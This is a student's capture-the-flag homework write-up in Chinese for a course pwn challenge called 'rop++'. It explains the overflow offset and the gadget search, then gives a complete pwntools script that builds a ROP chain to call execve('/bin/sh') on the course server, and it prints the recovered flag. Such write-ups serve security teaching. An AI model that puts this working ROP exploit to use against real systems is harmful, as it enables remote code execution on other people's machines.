# HW_rop++

1. 先用 checksec 確認檔案保護機制，這題沒有 PIE 保護，但有 Canary 及 NX 。

![截圖 2022-11-28 下午8.15.30.png](HW_rop++%20b03a7526f48b400998d6259fa0abdffe/%25E6%2588%25AA%25E5%259C%2596_2022-11-28_%25E4%25B8%258B%25E5%258D%25888.15.30.png)

1. 檢查原始碼，發現有一個很明顯的 buffer overflow 可以利用，buf[0x10] 的長度是 0x10 ，但是下面的 read 卻可以讀入 0x200 個 byte，因此我們在這邊只要找到 buf 在 stack 上面跟 return address 的距離，就可以讓程式植人我們設計好的 payload。

![截圖 2022-12-01 下午1.49.28.png](HW_rop++%20b03a7526f48b400998d6259fa0abdffe/%25E6%2588%25AA%25E5%259C%2596_2022-12-01_%25E4%25B8%258B%25E5%258D%25881.49.28.png)

1. 接下來我們先找到 overflow 的 offset，先讓程式執行到輸入的地方，並隨意輸入字串，輸入完成後，可以看到 rsi 的位置跟 rbp 的位置差了 0x20 個 byte，然後會要再加上 old rbp 0x8 byte 就可以得到 buf 跟 return address 的距離是 0x28。所以 offset 就是 0x28。另外在解這題的過程中，因為 offset 一直找錯，所以有去練習 buffer overflow 的題目練習找 offset，還發現如果 offset 找錯，可以用 IDA pro 來確認自己輸入的地方 跟 return address 的距離是不是跟自己找到的一樣。

![截圖 2022-11-30 下午12.40.23.png](HW_rop++%20b03a7526f48b400998d6259fa0abdffe/%25E6%2588%25AA%25E5%259C%2596_2022-11-30_%25E4%25B8%258B%25E5%258D%258812.40.23.png)

![截圖 2022-12-01 下午3.52.13.png](HW_rop++%20b03a7526f48b400998d6259fa0abdffe/%25E6%2588%25AA%25E5%259C%2596_2022-12-01_%25E4%25B8%258B%25E5%258D%25883.52.13.png)

1. 這題沒有 Seccomp 的限制，所以可以直接想辦法取得 shell，而取得的方式就是按照題目的提示使用 ROP 的方式，要有一段程式碼是可以執行 sys_execve("/bin/sh", NULL, NULL)，但這邊會要先將 “/bin/sh” 字串寫入記憶體，然後再利用 execve code 去呼叫這個 system call。因為要先將字串寫入記憶體，所以要先在記憶體中找一段可讀寫的位置，用 readelf 找到 .data = 0x4c50e0 這個位置。
    
    ![截圖 2022-12-01 下午2.36.02.png](HW_rop++%20b03a7526f48b400998d6259fa0abdffe/%25E6%2588%25AA%25E5%259C%2596_2022-12-01_%25E4%25B8%258B%25E5%258D%25882.36.02.png)
    

1. 接下來就是找可以利用的 gadget，先用 “ROPgadget --multibr --binary ./chal > dump，把 ROPgadget  的資料存下來，然後用 “cat dump | grep " pop x ; ret ” ，依依尋找可以利用的 pop rdi、pop rsi、pop rdx、pop rax、syscall 的 gedget ，而除了 “pop rdx ; ret” ，沒有找到，其他都有找到，這邊雖然沒有 “pop rdx ; ret” 但有 “pop rdx ; pop rbx ; ret” ，有了這些，基本上就可以控制暫存器的值，並做各種 syscall。

![截圖 2022-12-01 下午3.23.48.png](HW_rop++%20b03a7526f48b400998d6259fa0abdffe/%25E6%2588%25AA%25E5%259C%2596_2022-12-01_%25E4%25B8%258B%25E5%258D%25883.23.48.png)

![截圖 2022-12-01 下午3.24.05.png](HW_rop++%20b03a7526f48b400998d6259fa0abdffe/%25E6%2588%25AA%25E5%259C%2596_2022-12-01_%25E4%25B8%258B%25E5%258D%25883.24.05.png)

![截圖 2022-12-01 下午3.24.33.png](HW_rop++%20b03a7526f48b400998d6259fa0abdffe/%25E6%2588%25AA%25E5%259C%2596_2022-12-01_%25E4%25B8%258B%25E5%258D%25883.24.33.png)

![截圖 2022-12-01 下午3.25.02.png](HW_rop++%20b03a7526f48b400998d6259fa0abdffe/%25E6%2588%25AA%25E5%259C%2596_2022-12-01_%25E4%25B8%258B%25E5%258D%25883.25.02.png)

![截圖 2022-12-01 下午3.27.23.png](HW_rop++%20b03a7526f48b400998d6259fa0abdffe/%25E6%2588%25AA%25E5%259C%2596_2022-12-01_%25E4%25B8%258B%25E5%258D%25883.27.23.png)

1. 然後按照前面的邏輯組成這題要用的 ROPchain，主要就兩個步驟，第一個是將 /bin/sh\x00 寫入找好的 memory 位置，第二個是用 syscall 呼叫 execve。第一個步驟，因為要將字串放到一個記憶體位置，所以會需要一個 “mov qword ptr [ register 1], register 2 ; ret”，而因為 rdi、rsi、rdx、rax、rbx 的值我都可以控制，所以 register 1 跟  register 2 只要是其中任一個都可以，而我用指令 “cat dump | grep "mov qword ptr \[.*\],” 找到的是
mov qword ptr \[rsi\], rax ; ret，所以第一格步驟就沒問題了，第二個步驟就是經典的 execve syscall 呼叫，下面是我寫出來的 ROPchain。

![截圖 2022-12-01 下午3.32.50.png](HW_rop++%20b03a7526f48b400998d6259fa0abdffe/%25E6%2588%25AA%25E5%259C%2596_2022-12-01_%25E4%25B8%258B%25E5%258D%25883.32.50.png)

```python
ROP = flat( 
    #write '/bin/sh\x00' to memory
    pop_rsi, buf,
    pop_rax, b'/bin/sh\x00',
    mov_ptr_rsi_rax,

    #sys_execve("/bin/sh", NULL, NULL); [rdi:buf, rsi:0 ,rdx:0 ,rax:0x3b]
    pop_rdi, buf,
    pop_rsi, 0,
    pop_rdx_rbx, 0, 0,
    pop_rax, 0x3b,
    syscall,
)
```

1. 有了 offset 的 padding  跟 ROPchain ，就可以組成 Payload 送出，然後成功取得 shell，並開啟藏在 “home/chal/” 的 flag，取得 FLAG{chocolate_c378985d629e99a4e86213db0cd5e70d}。

```python
from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
r = remote('edu-ctf.zoolab.org', 10003)
#r = process("/home/kali/temp/rop++/share/chal")
#gdb.attach(r, gdbscript='b *0x401798')

pop_rdi = 0x401e3f 
pop_rsi = 0x409e6e 
mov_ptr_rsi_rax = 0x449fa5

pop_rdx_rbx = 0x47ed0b
pop_rax = 0x447b27
syscall = 0x414506 

buf = 0x4c50e0
ROP = flat( 
    #write '/bin/sh\x00' to memory
    pop_rsi, buf,
    pop_rax, b'/bin/sh\x00',
    mov_ptr_rsi_rax,

    #sys_execve("/bin/sh", NULL, NULL); [rdi:buf, rsi:0 ,rdx:0 ,rax:0x3b]
    pop_rdi, buf,
    pop_rsi, 0,
    pop_rdx_rbx, 0, 0,
    pop_rax, 0x3b,
    syscall,
)

print(b'A'*0x28 + ROP)
r.sendlineafter(b'show me rop\n> ', b'A'*0x28+ ROP)
r.interactive()
```

![截圖 2022-12-01 下午3.46.50.png](HW_rop++%20b03a7526f48b400998d6259fa0abdffe/%25E6%2588%25AA%25E5%259C%2596_2022-12-01_%25E4%25B8%258B%25E5%258D%25883.46.50.png)

![截圖 2022-12-01 下午3.47.34.png](HW_rop++%20b03a7526f48b400998d6259fa0abdffe/%25E6%2588%25AA%25E5%259C%2596_2022-12-01_%25E4%25B8%258B%25E5%258D%25883.47.34.png)